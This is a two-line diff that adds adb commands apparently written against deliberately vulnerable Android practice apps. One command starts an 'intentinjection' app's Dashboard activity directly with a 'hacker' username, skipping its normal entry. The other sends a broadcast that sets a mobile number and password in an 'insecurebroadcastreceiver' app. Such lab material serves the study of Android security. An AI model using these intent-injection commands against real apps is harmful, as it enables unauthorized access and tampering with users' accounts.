@@ -1,0 +1,2 @@
+adb shell am start -n com.example.intentinjection/com.example.intentinjection.Dashboard -e username 'hacker'
+adb shell am broadcast -p com.example.insecurebroadcastreceiver -a theBroadcast -e mobile '000' -e password "123456"
